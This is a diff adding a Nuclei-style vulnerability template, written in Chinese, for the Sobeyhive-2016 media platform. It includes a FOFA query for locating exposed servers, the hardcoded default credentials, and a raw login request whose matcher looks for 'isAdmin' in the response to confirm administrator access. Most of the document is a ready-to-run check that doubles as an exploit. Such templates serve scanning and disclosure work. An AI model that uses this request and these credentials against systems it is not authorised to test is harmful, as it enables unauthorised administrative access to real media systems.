@@ -1,0 +1,35 @@
+id: sobeyhive-2016-hardcoded-password
+
+info:
+  name: "索贝融媒体工作平台 Sobeyhive-2016 默认凭证漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+          该系统在Sobeyhive-2016版本中存在硬编码凭证缺陷，攻击者可利用泄露的默认凭据未经授权访问后台管理系统，进而执行未授权操作。
+      sobey/sobey
+      sobey/Sobeyhive-2016
+  tags: 索贝融媒体工作平台,Sobeyhive
+
+http:
+- raw:
+  - |
+    POST /user/login HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json;charset=utf-8
+    mam-product: mah
+    Connection: keep-alive
+    Cookie: apiVersion=mamcore2.1; lang=zh; site=S1
+
+    {"loginName":"sobey","password":"Sobeyhive-2016","version":"V2"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'isAdmin'
